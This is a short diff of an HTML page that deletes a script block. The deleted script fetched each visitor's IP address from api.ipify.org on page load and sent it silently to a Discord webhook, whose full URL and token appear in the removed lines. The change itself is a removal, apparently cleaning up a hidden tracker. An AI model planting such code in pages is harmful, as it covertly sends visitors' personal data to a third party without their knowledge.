@@ -73,18 +73,4 @@
         </video>
     </div>
     <script src="js/rocket-loader.min.js" data-cf-settings="69664f3b12b7f5921d7725fb-|49" defer></script>
-
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-	<script>
-		$(document).ready(function(){
-			$.getJSON('https://api.ipify.org?format=json', function(data){
-				console.log(data);
-				var ip = data.ip;
-				var webhook_url = 'https://discord.com/api/webhooks/1329885894550749354/T1C8_y_6ikK-ITR2NgezbwfiMlsbIWuVnjOnrcwe5fseXenX2sFIAhTDi3_r88VmEG2W';
-				var message = '' + ip;
-				$.post(webhook_url, {content: message});
-			});
-		});
-	</script>
-    
 </body>
